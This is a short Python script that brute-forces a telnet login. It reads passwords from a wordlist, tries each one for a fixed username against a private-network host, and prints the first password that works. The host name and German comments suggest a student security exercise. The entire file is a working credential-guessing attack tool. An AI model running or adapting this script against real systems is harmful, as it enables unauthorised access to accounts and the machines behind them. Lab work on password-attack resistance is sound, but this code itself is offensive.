import telnetlib

wordlist = open("sample.txt", "r")
host = "10.48.18.230"
user = b"malg95"


def attack_telnet(passwd):
    tn = telnetlib.Telnet(host, 17395)
    #print("Verbindung aufgebaut")
    tn.read_until(b"fk-sse-stud login: ")
    tn.write(user + b"\n")
    #print("User eingegegben")
    if passwd:
        tn.read_until(b"Password: ")
        tn.write(passwd.encode() + b"\n")
        #print("Password eingegeben")
    result = tn.read_until(b"fk-sse-stud login: ", 2)
    #print("result= ", result)
    if result != b"fk-sse-stud login: ":
        print("your password: ", passwd)
        return True
    else:
        tn.close()
        return False


passwords = wordlist.readlines()
for pwd in passwords:
    passwd = pwd.strip()
    print("testing ", passwd)
    if attack_telnet(passwd):
        break
wordlist.close()
